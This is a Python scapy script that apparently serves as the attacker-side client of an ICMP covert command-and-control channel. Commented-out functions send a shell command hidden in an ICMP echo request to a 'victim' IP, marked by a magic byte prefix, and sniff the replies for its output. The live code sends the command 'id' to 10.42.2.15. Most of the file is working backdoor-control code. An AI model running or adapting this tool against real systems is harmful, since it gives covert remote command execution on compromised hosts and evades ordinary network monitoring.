#!/usr/bin/python3
from scapy.all import IP, ICMP, Raw, send, sniff, srp
from os import popen
from sys import argv
import threading
from time import sleep



# def send_command(victim_ip, command, force):
#     pkt = IP(dst=victim_ip) /\
#         ICMP(type=8) /\
#         Raw(load=f"\x70\x95\x05{command}")
#     send(pkt, verbose=False)

# keep_sniffing = True
# def process_packet(packet):
#     global keep_sniffing
#     if packet.haslayer(ICMP) and packet[ICMP].type == 0 and packet[IP].src == victim_ip:
#         if packet.haslayer(Raw):
#             payload = packet[Raw].load
#             output = payload.decode('utf-8').strip()
#             print()
#             print(output)
#             keep_sniffing = False

# # need to refactor to srp if possible
# def start_sniffing():
#     sniff(iface=get_IF_NAME(), filter="icmp", prn=process_packet, store=0)

# def main():
#     if len(argv) < 2 or argv[1] == "":
#         print("Usage: ./script.py <Victim_IP>")
#         return

#     vic_ip = argv[1]
#     global victim_ip
#     victim_ip = vic_ip
#     force = "-f" in argv
#     cmd = input("Command: ")

#     # Start sniffing in a separate thread
#     sniffing_thread = threading.Thread(target=start_sniffing, daemon=True)
#     sniffing_thread.start()

#     # Send the command to the victim IP
#     send_command(vic_ip, cmd, force)

#     # Wait until sniffing is complete
#     while keep_sniffing:
#         sleep(0.1)

# if __name__ == "__main__":
#     main()

if __name__ == "__main__":
    pkt = IP(dst="10.42.2.15") /\
        ICMP(type=8) /\
        Raw(load=f"id")
    res = srp(pkt, verbose=False)
    res.ls()